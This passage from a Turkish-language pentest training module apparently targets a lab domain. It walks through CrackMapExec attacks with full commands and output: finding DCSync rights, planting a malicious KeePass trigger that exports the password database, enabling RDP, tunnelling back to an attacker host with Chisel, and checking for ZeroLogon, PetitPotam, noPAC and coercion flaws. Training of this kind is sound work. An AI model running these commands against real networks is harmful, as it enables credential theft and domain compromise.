[*] Trustee (SID) : RAS and IAS Servers (S-1-5-21-
3325992272-2815718403-617452758-553)
[*] ACE[2] info
[*] ACE Type : ACCESS_ALLOWED_OBJECT_ACE
[*] ACE flags : None
[*] Access mask : ReadProperty
[*] Flags : ACE_OBJECT_TYPE_PRESENT
[*] Object type (GUID) : User-Logon (5f202010-79a5-11d0-9020-
00c04fc2d4cf)
[*] Trustee (SID) : RAS and IAS Servers (S-1-5-21-
3325992272-2815718403-617452758-553)
<SNIP>
```


Ayrıca belirli hakları da arayabiliriz, örneğin hangi **principal**'ların **DCSync** haklarına sahip olduğunu. Bunun için **`TARGET_DN`** seçeneğini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seçeneğini seçmemiz ve aramak istediğimiz hakları **`RIGHTS`** seçeneğiyle belirlememiz gerekir.

### DCSync Rights'a Sahip Kullanıcıları Arama

```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M
daclread -o TARGET_DN="DC=inlanefreight,DC=htb" ACTION=read RIGHTS=DCSync

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
DACLREAD dc01.inlanefreight.htb 389 DC01 Be carefull,
this module cannot read the DACLS recursively.
DACLREAD dc01.inlanefreight.htb 389 DC01 Target
principal found in LDAP (DC=inlanefreight,DC=htb)
[*] ACE[3] info
[*] ACE Type : ACCESS_ALLOWED_OBJECT_ACE
[*] ACE flags : None
[*] Access mask : ControlAccess
[*] Flags : ACE_OBJECT_TYPE_PRESENT
[*] Object type (GUID) : DS-Replication-Get-Changes-All
(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
[*] Trustee (SID) : Domain Controllers (S-1-5-21-
3325992272-2815718403-617452758-516)
[*] ACE[4] info
[*] ACE Type : ACCESS_ALLOWED_OBJECT_ACE
[*] ACE flags : None
[*] Access mask : ControlAccess
[*] Flags : ACE_OBJECT_TYPE_PRESENT
[*] Object type (GUID) : DS-Replication-Get-Changes-All
(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
[*] Trustee (SID) : robert (S-1-5-21-3325992272-2815718403-
617452758-2607)
[*] ACE[17] info
[*] ACE Type : ACCESS_ALLOWED_OBJECT_ACE
[*] ACE flags : None
[*] Access mask : ControlAccess
[*] Flags : ACE_OBJECT_TYPE_PRESENT
[*] Object type (GUID) : DS-Replication-Get-Changes-All
(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
[*] Trustee (SID) : Administrators (S-1-5-32-544)
```



Çıktıda gösterildiği gibi, `ACE[4]` `robert` kullanıcısının hedef domain'de `DCSync` haklarına sahip olduğunu gösterir.

LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.

### LDAP Protocol Modules

```
crackmapexec ldap -L

[*] MAQ Retrieves the MachineAccountQuota domainlevel attribute
[*] adcs Find PKI Enrollment Services in Active
Directory and Certificate Templates Names
[*] daclread Read and backup the Discretionary Access
Control List of objects. Based on the work of @_nwodtuhs and @BlWasp_. Be
carefull, this module cannot read the DACLS recursively, more explains in
the options.
[*] get-desc-users Get description of the users. May contained password
[*] get-network
[*] laps Retrieves the LAPS passwords
[*] ldap-checker Checks whether LDAP signing and binding are required and / or enforced
[*] ldap-signing Check whether LDAP signing is required
[*] subnets Retrieves the different Sites and Subnets of an Active Directory
[*] user-desc Get user descriptions stored in Active Directory
[*] whoami Get details of provided user
```


### SMB Protocol Modules

SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.

Not: SMB kullanan modüllerin çoğunun çalışması için admin haklarına ( `Pwned!` ) ihtiyaç vardır.


### SMB Modülleri - get_netconnections ve ioxidresolver

Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. `get_netconnections` ve `ioxidresolver` modüllerini kullanalım ve farklarını görelim.

`get_netconnections` modülü, ağ bağlantılarını sorgulamak için `WMI` kullanır. `IPv6` ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.


### get_netconnections Module

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M get_netconnections

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
GET_NETC... 10.129.203.121 445 DC01 [+] IP Address:
['172.16.1.10', '172.16.2.50', 'fe80::3cd3:b51c:e8b9:b36f'] Search Domain:
['inlanefreight.htb', '.htb']
GET_NETC... 10.129.203.121 445 DC01 [+] IP Address:
['10.129.203.121'] Search Domain: ['inlanefreight.htb', '.htb']
GET_NETC... 10.129.203.121 445 DC01 [*] Saved raw output
to network-connections-10.129.203.121-2022-11-14_115228.log
```


Öte yandan, `ioxidresolver` modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül `IPv6` adreslerini içermez.

### ioxidresolver Module

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M ioxidresolver

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
IOXIDRES... 10.129.203.121 445 DC01 Address: 172.16.1.10
IOXIDRES... 10.129.203.121 445 DC01 Address: 172.16.2.50
IOXIDRES... 10.129.203.121 445 DC01 Address:
10.129.203.121

```


Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal ağlarda adminler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir password manager'dır. Bir master password onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.

### KeePass'i Keşfetme

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_discover

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121 445 DC01 Found process
"KeePass" with PID 5004 (user INLANEFREIGHT\julio)
KEEPASS_... 10.129.203.121 445 DC01 Found
C:\Users\julio\AppData\Roaming\KeePass\KeePass.config.xml
KEEPASS_... 10.129.203.121 445 DC01 Found
C:\Users\julio\Application Data\KeePass\KeePass.config.xml
KEEPASS_... 10.129.203.121 445 DC01 Found
C:\Users\julio\Documents\Database.kdbx
KEEPASS_... 10.129.203.121 445 DC01 Found
C:\Users\julio\My Documents\Database.kdbx
```

Eğer master parolaya sahip değilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın triger sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.

Bunu kullanmak için beş (5) adıma ihtiyacımız var:

*  KeePass yapılandırma dosyasını bulun. Biz bunu `keepass_discover` modülü ile yaptık.
 * `ACTION=ADD` seçeneğini ve `KEEPASS_CONFIG_PATH` öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.

### KeePass Yapılandırma Dosyasına Trigger Ekleme

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -
o ACTION=ADD

KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.
xml
[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121 445 DC01 [*] Adding trigger "export_database" to
"C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml"
KEEPASS_... 10.129.203.121 445 DC01 [+] Malicious trigger
successfully added, you can now wait for KeePass reload and poll the
exported files
```

Not: KeePass yapılandırma yolu için ters eğik çizgi (`/`) veya çift eğik çizgi (`\`) kullandığınızdan emin olun.

* Kullanıcının KeePass'i açmasını ve master parolayı girmesini bekleyin. Bu işlemi zorlamak için `ACTION=RESTART` seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, `USER=julio` gibi kullanıcı adı ile `USER` seçeneğini ekleyebiliriz.

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -
o ACTION=RESTART

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121 445 DC01 [*] Restarting
INLANEFREIGHT\julio's KeePass process
```


`ACTION=POLL` seçeneğini kullanarak export edilen veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.


### Ele Geçirilen Hedeften Export Verileri Sorgulama

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -
o ACTION=POLL

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121 445 DC01 [*] Polling for
database export every 5 seconds, please be patient
KEEPASS_... 10.129.203.121 445 DC01 [*] we need to wait
for the target to enter his master password ! Press CTRL+C to abort and
use clean option to cleanup everything
KEEPASS_... 10.129.203.121 445 DC01 [+] Found database
export !
KEEPASS_... 10.129.203.121 445 DC01 [+] Moved remote
"C:\Users\Public\export.xml" to local "/tmp/export.xml"
```

```
cat /tmp/export.xml | grep -i protectinmemory -A 5
 <Value
ProtectInMemory="True">ForNewDCAnew92Pas#$</Value>
	 </String>
	 <String>
		 <Key>Title</Key>
		 <Value>Administrator</Value>
	 </String>

```


`ACTION=CLEAN` seçeneğini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapılandırma dosyasını temizleyin

### Clean Configuration File Changes

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -o ACTION=CLEAN

KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.
xml
[!] Module is not opsec safe, are you sure you want to run this? [Y/n]
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121 445 DC01 [*] No export found in
C:\Users\Public , everything is cleaned
KEEPASS_... 10.129.203.121 445 DC01 [*] Found trigger
"export_database" in configuration file, removing
KEEPASS_... 10.129.203.121 445 DC01 [*] Restarting
INLANEFREIGHT\julio's KeePass process

```


Bu modülün her seçeneğini öğrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seçeneğin iyi yanı, **extract_password** yöntemini de içermesidir; bu yöntem **.xml** dosyasında herhangi bir parola girişini arar ve konsola yazdırır.


### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -
o ACTION=ALL

KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.
xml
[!] Module is not opsec safe, are you sure you want to run this? [Y/n] Y
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121 445 DC01
KEEPASS_... 10.129.203.121 445 DC01 [*] Adding trigger
"export_database" to
"C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml"
KEEPASS_... 10.129.203.121 445 DC01 [+] Malicious trigger
successfully added, you can now wait for KeePass reload and poll the
exported files
KEEPASS_... 10.129.203.121 445 DC01
KEEPASS_... 10.129.203.121 445 DC01 [*] Restarting
INLANEFREIGHT\julio's KeePass process
KEEPASS_... 10.129.203.121 445 DC01 [*] Polling for
database export every 5 seconds, please be patient
KEEPASS_... 10.129.203.121 445 DC01 [*] we need to wait
for the target to enter his master password ! Press CTRL+C to abort and
use clean option to cleanup everything
...
KEEPASS_... 10.129.203.121 445 DC01 [+] Found database
export !
KEEPASS_... 10.129.203.121 445 DC01 [+] Moved remote
"C:\Users\Public\export.xml" to local "/tmp/export.xml"
KEEPASS_... 10.129.203.121 445 DC01
KEEPASS_... 10.129.203.121 445 DC01 [*] Cleaning
everything..
KEEPASS_... 10.129.203.121 445 DC01 [*] No export found in
C:\Users\Public , everything is cleaned
KEEPASS_... 10.129.203.121 445 DC01 [*] Found trigger
"export_database" in configuration file, removing
KEEPASS_... 10.129.203.121 445 DC01 [*] Restarting
INLANEFREIGHT\julio's KeePass process
KEEPASS_... 10.129.203.121 445 DC01
KEEPASS_... 10.129.203.121 445 DC01 [*] Extracting
password..
KEEPASS_... 10.129.203.121 445 DC01 Notes : None
KEEPASS_... 10.129.203.121 445 DC01 Password :
ForNewDCAnew92Pas#$
KEEPASS_... 10.129.203.121 445 DC01 Title : Administrator
KEEPASS_... 10.129.203.121 445 DC01 URL : None
KEEPASS_... 10.129.203.121 445 DC01 UserName :
Administrator
<SNIP>

```

Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre `/tmp/export.xml` dosyasında olacaktır, böylece manuel olarak alabiliriz.

### RDP'yi Etkinleştirme veya Devre Dışı Bırakma

Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü lateral hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.

Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. `ACTION` seçeneğini ve ardından `enable` veya `disable` seçeneklerini belirtmemiz gerekir.


### RDP'yi Etkinleştirme

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M rdp --options

[*] rdp module options:
		 ACTION Enable/Disable RDP (choices: enable, disable)
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M rdp -o
ACTION=enable
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
RDP 10.129.203.121 445 DC01 [+] RDP enabled
successfully
```


SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.


### SMB Protocol Modules

```
crackmapexec smb -L

[*] bh_owned Set pwned computer as owned in Bloodhound
[*] dfscoerce Module to check if the DC is vulnerable to
DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam
[*] drop-sc Drop a searchConnector-ms file on each
writable share
[*] empire_exec Uses Empire's RESTful API to generate a
launcher for the specified listener and executes it
[*] enum_avproducts Gathers information on all endpoint
protection solutions installed on the remote host(s) via WMI
[*] enum_dns Uses WMI to dump DNS from an AD DNS Server
[*] get_netconnections Uses WMI to query network connections.
[*] gpp_autologin Searches the domain controller for
registry.xml to find autologon information and returns the username and
password.
[*] gpp_password Retrieves the plaintext password and other
information for accounts pushed through Group Policy Preferences.
[*] handlekatz Get lsass dump using handlekatz64 and parse
the result with pypykatz
[*] hash_spider Dump lsass recursively from a given hash
using BH to find local admins
[*] impersonate List and impersonate tokens to run command
as locally logged on users
[*] install_elevated Checks for AlwaysInstallElevated
[*] ioxidresolver Thie module helps you to identify hosts that
have additional active interfaces
[*] keepass_discover Search for KeePass-related files and
process.
[*] keepass_trigger Set up a malicious KeePass trigger to export
the database in cleartext.
[*] lsassy Dump lsass and parse the result remotely
with lsassy
[*] masky Remotely dump domain user credentials via an
ADCS and a KDC
[*] met_inject Downloads the Meterpreter stager and injects
it into memory
[*] ms17-010 MS17-010, /!\ not tested oustide home lab
[*] nanodump Get lsass dump using nanodump and parse the
result with pypykatz
[*] nopac Check if the DC is vulnerable to CVE-2021-
42278 and CVE-2021-42287 to impersonate DA from standard domain user
[*] ntlmv1 Detect if lmcompatibilitylevel on the target
is set to 0 or 1
[*] petitpotam Module to check if the DC is vulnerable to
PetitPotam, credit to @topotam
[*] procdump Get lsass dump using procdump64 and parse
the result with pypykatz
[*] rdp Enables/Disables RDP
[*] runasppl Check if the registry value RunAsPPL is set
or not
[*] scuffy Creates and dumps an arbitrary .scf file
with the icon property containing a UNC path to the declared SMB server
against all writeable shares
[*] shadowcoerce Module to check if the target is vulnerable
to ShadowCoerce, credit to @Shutdown and @topotam
[*] slinky Creates windows shortcuts with the icon
attribute containing a UNC path to the specified SMB server in all shares
with write permissions
[*] spider_plus List files on the target server (excluding
`DIR` directories and `EXT` extensions) and save them to the `OUTPUT`
directory if they are smaller then `SIZE`
[*] spooler Detect if print spooler is enabled or not
[*] teams_localdb Retrieves the cleartext ssoauthcookie from
the local Microsoft Teams database, if teams is open we kill all Teams
process
[*] test_connection Pings a host
[*] uac Checks UAC status
[*] wdigest Creates/Deletes the 'UseLogonCredential'
registry key enabling WDigest cred dumping on Windows >= 8.1
[*] web_delivery Kicks off a Metasploit Payload using the
exploit/multi/script/web_delivery module
[*] webdav Checks whether the WebClient service is
running on the target
[*] wireless Get key of all wireless interfaces
[*] zerologon Module to check if the DC is vulnerable to
Zerologon aka CVE-2020-1472
```

Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız

### Vulnerability Scan Modules

Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.

CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geçirdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi `172.16.10.3`'tür.

Domain'e erişim sağlamak için, CME ile ProxyChain bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız


### Chisel'i Hedef Makineye Gönderme

```
crackmapexec smb 10.129.204.146 -u Administrator -p 'IpreferanewP@$' --
put-file ./chisel.exe \\Windows\\Temp\\chisel.exe --local-auth

SMB 10.129.204.146 445 WS01 [*] Windows Server
2016 Standard 14393 x64 (name:WS01) (domain:WS01) (signing:False)
(SMBv1:True)
SMB 10.129.204.146 445 WS01 [+]
WS01\Administrator:IpreferanewP@$ (Pwn3d!)
SMB 10.129.204.146 445 WS01 [*] Copy ./chisel.exe
to \Windows\Temp\chisel.exe
SMB 10.129.204.146 445 WS01 [+] Created file
./chisel.exe on \\C$\\Windows\Temp\chisel.exe
```


### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma

```
/chisel server --reverse
2022/11/06 10:57:00 server: Reverse tunnelling enabled
2022/11/06 10:57:00 server: Fingerprint
CelKxt2EsL1SUFnvo634FucIOPqlFKQJi8t/aTjRfWo=
2022/11/06 10:57:00 server: Listening on http://0.0.0.0:8080
```


### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama

```
crackmapexec smb 10.129.204.146 -u Administrator -p 'IpreferanewP@$' -x
"C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks" --local-auth

SMB 10.129.204.146 445 WS01 [*] Windows Server
2016 Standard 14393 x64 (name:WS01) (domain:WS01) (signing:False)
(SMBv1:True)
SMB 10.129.204.146 445 WS01 [+]
WS01\Administrator:IpreferanewP@$ (Pwn3d!)
```


### Vulnerability Scan Modules

CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.


### ZeroLogon

Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in controller'ı ele geçirmek için savunmasız bir Netlogon session'ı başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.

CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.


### ZeroLogon Güvenlik Açığı Kontrolü

```
proxychains4 -q crackmapexec smb 172.16.10.3 -M Zerologon

SMB 172.16.10.3 445 DC01 [*] Windows Server
2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB)
(signing:True) (SMBv1:True)
ZEROLOGO... 172.16.10.3 445 DC01 VULNERABLE
ZEROLOGO... 172.16.10.3 445 DC01 Next step:
https://github.com/dirkjanm/CVE-2020-1472

```


### PetitPotam

Güvenlik araştırmacısı [Gilles Lionel](https://twitter.com/topotam77) kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu servisine (örneğin bir Domain Controller) yönelik klasik bir `NTLM relay` saldırısıdır. Lionel ayrıca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir proof of  concept kodu da yayınladı.

CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan `petitpotam` adlı bir modül içerir.


### Petitpotam Güvenlik Açığı Kontrolü

```
proxychains4 -q crackmapexec smb 172.16.10.3 -M PetitPotam

SMB 172.16.10.3 445 DC01 [*] Windows Server
2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB)
(signing:True) (SMBv1:True)
PETITPOT... 172.16.10.3 445 DC01 VULNERABLE
PETITPOT... 172.16.10.3 445 DC01 Next step:
https://github.com/topotam/PetitPotam

```


### noPAC

noPAC güvenlik açığının exploit'i, normal bir domain kullanıcısının ayrıcalıklarının bir domain admin yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.

CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.


### noPAC vulnerability check

```
proxychains4 -q crackmapexec smb 172.16.10.3 -u carole.holmes -p 'Y3t4n0th3rP4ssw0rd' -M nopac

SMB 172.16.10.3 445 DC01 [*] Windows Server
2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB)
(signing:True) (SMBv1:True)
SMB 172.16.10.3 445 DC01 [+]
INLANEFREIGHT.HTB\carole.holmes:Y3t4n0th3rP4ssw0rd
NOPAC 172.16.10.3 445 DC01 TGT with PAC size 1564
NOPAC 172.16.10.3 445 DC01 TGT without PAC size
759
NOPAC 172.16.10.3 445 DC01
NOPAC 172.16.10.3 445 DC01 VULNEABLE
NOPAC 172.16.10.3 445 DC01 Next step:
https://github.com/Ridter/noPac
```



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin controller'ı ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.

Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü `dfscoerce`'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için `Y3t4n0th3rP4ssw0rd` şifresiyle `carole.holmes` hesabını kullanacağız.


### DFSCoerce Vulnerability Check

```
proxychains4 -q crackmapexec smb 172.16.10.3 -u carole.holmes -p 'Y3t4n0th3rP4ssw0rd' -M dfscoerce

SMB 172.16.10.3 445 DC01 [*] Windows Server
2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB)
(signing:True) (SMBv1:True)
SMB 172.16.10.3 445 DC01 [+]
INLANEFREIGHT.HTB\carole.holmes:Y3t4n0th3rP4ssw0rd
DFSCOERC... 172.16.10.3 445 DC01 VULNERABLE
DFSCOERC... 172.16.10.3 445 DC01 Next step:
https://github.com/Wh04m1001/DFSCoerce
```


### ShadowCoerce

ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.

CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.


### ShadowCoerce Vulnerability Check

```
proxychains4 -q crackmapexec smb 172.16.10.3 -u carole.holmes -p 'Y3t4n0th3rP4ssw0rd' -M shadowcoerce

SMB 172.16.10.3 445 DC01 [*] Windows Server
2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB)
(signing:True) (SMBv1:True)
SMB 172.16.10.3 445 DC01 [+]
INLANEFREIGHT.HTB\carole.holmes:Y3t4n0th3rP4ssw0rd
```


Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( `logging.debug` ) ile bazı debug log'ları eklediğini göreceğiz. CrackMapExec'i hata debug modunda çalıştırırsak, bu logları yazdıracaktır.

CrackMapExec'i debug modunda çalıştırmak için protokolden önce `--verbose` seçeneğini kullanabiliriz


### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma

```
proxychains4 -q crackmapexec --verbose smb 172.16.10.3 -u carole.holmes -p
'Y3t4n0th3rP4ssw0rd' -M shadowcoerce

DEBUG:root:Passed args:
{'aesKey': None,
'amsi_bypass': None,
'clear_obfscripts': False,
'codec': 'utf-8',
'computers': None,
'connectback_host': None,
'content': False,
'continue_on_success': False,
'cred_id': [],
'darrell': False,
'depth': None,
'disks': False,
'domain': None,
'enabled': False,
'exclude_dirs': '',
'exec_method': None,
'execute': None,
'export': None,
'fail_limit': None,
'force_ps32': False,
'gen_relay_list': None,
'get_file': None,
'gfail_limit': None,
'groups': None,
'hash': [],
'jitter': None,
'kdcHost': None,
'kerberos': False,
'laps': None,
'list_modules': False,
'local_auth': False,
'local_groups': None,
'loggedon_users': False,
<SNIP>
'wmi': None,
'wmi_namespace': 'root\\cimv2'}
DEBUG:asyncio:Using selector: EpollSelector
DEBUG Using selector: EpollSelector
DEBUG:root:Running
DEBUG Running
DEBUG:root:Started thread poller
DEBUG Started thread poller
SMB 172.16.10.3 445 DC01 [*] Windows Server
2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB)
(signing:True) (SMBv1:True)
DEBUG:root:add_credential(credtype=plaintext, domain=INLANEFREIGHT,
username=carole.holmes, password=Y3t4n0th3rP4ssw0rd, groupid=None,
pillaged_from=None) => None
DEBUG add_credential(credtype=plaintext, domain=INLANEFREIGHT,
username=carole.holmes, password=Y3t4n0th3rP4ssw0rd, groupid=None,
pillaged_from=None) => None
SMB 172.16.10.3 445 DC01 [+]
INLANEFREIGHT.HTB\carole.holmes:Y3t4n0th3rP4ssw0rd
DEBUG:root:Connecting to ncacn_np:172.16.10.3[\PIPE\FssagentRpc]
DEBUG Connecting to ncacn_np:172.16.10.3[\PIPE\FssagentRpc]
DEBUG:root:Something went wrong, check error status => SMB SessionError:
STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
DEBUG Something went wrong, check error status => SMB SessionError:
